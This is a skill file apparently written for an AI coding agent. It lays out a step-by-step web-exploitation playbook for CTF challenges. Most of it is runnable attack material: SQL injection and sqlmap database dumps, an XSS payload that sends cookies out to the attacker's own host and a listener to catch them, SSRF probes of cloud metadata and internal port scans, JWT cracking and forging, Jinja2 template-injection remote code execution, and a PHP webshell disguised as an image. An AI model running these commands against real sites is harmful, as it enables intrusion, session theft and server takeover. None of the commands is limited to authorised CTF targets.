---
name: ctf-toolkit-web
description: Executes web exploitation toolkit scripts for CTF challenges. Use when the challenge involves SQL injection, XSS, SSRF, auth bypass, JWT, SSTI, file upload, or any HTTP-based vulnerability. Runs sqli_tester.py, xss_scanner.py, and ssrf_tester.py from ~/ctf-toolkit/web/.
license: MIT
compatibility: Requires ~/ctf-toolkit. Python 3, requests, pycryptodome.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch
metadata:
  user-invocable: "true"
---

# CTF Toolkit — Web Exploitation

Operational skill: run the toolkit scripts directly. Pivot to `/ctf-web` for deep technique notes.

## Step 1 — Recon

```bash
# Headers and basic info
curl -sI "$TARGET_URL"
curl -s "$TARGET_URL/robots.txt" "$TARGET_URL/.git/HEAD" "$TARGET_URL/.env"

# Directory brute-force
ffuf -u "$TARGET_URL/FUZZ" -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# JS source / hidden routes
curl -s "$TARGET_URL" | grep -oE '(src|href)="[^"]*"' | head -30
```

## Step 2 — SQL Injection

```bash
TOOLKIT=~/ctf-toolkit

# Auto-detect injection type
python3 $TOOLKIT/web/sqli_tester.py --url "$TARGET_URL" --param id --mode detect

# If error-based confirmed: extract via UNION
python3 $TOOLKIT/web/sqli_tester.py --url "$TARGET_URL" --param id --mode union --cols 3

# If blind: boolean extraction
python3 $TOOLKIT/web/sqli_tester.py --url "$TARGET_URL" --param id --mode blind-bool \
  --query "SELECT table_name FROM information_schema.tables LIMIT 1"

# Time-based blind
python3 $TOOLKIT/web/sqli_tester.py --url "$TARGET_URL" --param id --mode blind-time --db mysql

# Auth bypass (POST login form)
python3 $TOOLKIT/web/sqli_tester.py --url "$TARGET_URL/login" --param x --mode auth

# sqlmap fallback (automated)
sqlmap -u "$TARGET_URL?id=1" --batch --dbs --level 3
sqlmap -u "$TARGET_URL?id=1" --batch -D ctf --dump
```

## Step 3 — XSS

```bash
# Scan for reflected XSS
python3 $TOOLKIT/web/xss_scanner.py --url "$TARGET_URL" --param q --mode scan -v

# Admin bot challenge: build exfil payload
python3 $TOOLKIT/web/xss_scanner.py --mode exfil \
  --exfil "http://$(curl -s ifconfig.me):8888" \
  --target "document.cookie"

# Start listener before submitting payload
python3 -m http.server 8888

# Print all payloads (CSP bypass set included)
python3 $TOOLKIT/web/xss_scanner.py --mode payloads
```

## Step 4 — SSRF

```bash
# Full scan: metadata + bypass + portscan + protocol wrappers
python3 $TOOLKIT/web/ssrf_tester.py --url "$TARGET_URL/fetch" --param url --mode all

# Cloud metadata (AWS/GCP/Azure)
python3 $TOOLKIT/web/ssrf_tester.py --url "$TARGET_URL/fetch" --param url --mode metadata

# Internal port scan via SSRF
python3 $TOOLKIT/web/ssrf_tester.py --url "$TARGET_URL/fetch" --param url \
  --mode portscan --host 127.0.0.1

# Protocol wrappers (gopher/dict/file)
python3 $TOOLKIT/web/ssrf_tester.py --url "$TARGET_URL/fetch" --param url --mode protos
```

## Step 5 — JWT

```bash
# Decode without verification
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Crack secret
flask-unsign --unsign --cookie "$JWT" --wordlist ~/wordlists/rockyou.txt

# Forge with cracked secret
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'found_secret'

# alg:none bypass
python3 - << 'EOF'
import base64, json
header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b"=")
print(f"{header.decode()}.{payload.decode()}.")
EOF
```

## Step 6 — SSTI

```bash
# Detection probes (send via the vulnerable parameter)
# Jinja2/Flask:   {{7*7}} → 49
# Twig:           {{7*'7'}} → 7777777
# Freemarker:     ${7*7} → 49
# Velocity:       #set($x=7*7)${x} → 49

# Jinja2 RCE
curl -s "$TARGET_URL?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"

# Jinja2 sandbox escape
curl -g "$TARGET_URL?name={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"
```

## Step 7 — File Upload to RCE

```bash
# Create PHP webshell with innocent extension
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Bypass content-type: add valid PNG header
python3 -c "
import struct
png = b'\x89PNG\r\n\x1a\n' + b'\x00'*4 + b'IHDR'
shell = b'<?php system(\$_GET[\"cmd\"]); ?>'
open('shell.png.php','wb').write(png + shell)
"

# Null byte truncation (old PHP)
# Upload filename: shell.php%00.jpg
```

## Decision Map

```
GET/POST parameter → try SQLi first (detect mode)
Input reflected in page → try XSS scan
Parameter accepts URL → try SSRF full scan
Login with JWT → decode + crack + forge
Template output in response → try SSTI probes
File upload present → try extension / content-type bypass
```

## Pivot

- Deep technique notes: `/ctf-web`
- Admin bot / stored XSS: `/ctf-toolkit-web` exfil mode + `/ctf-0clicks`
- Binary behind the web endpoint: `/ctf-toolkit-pwn`
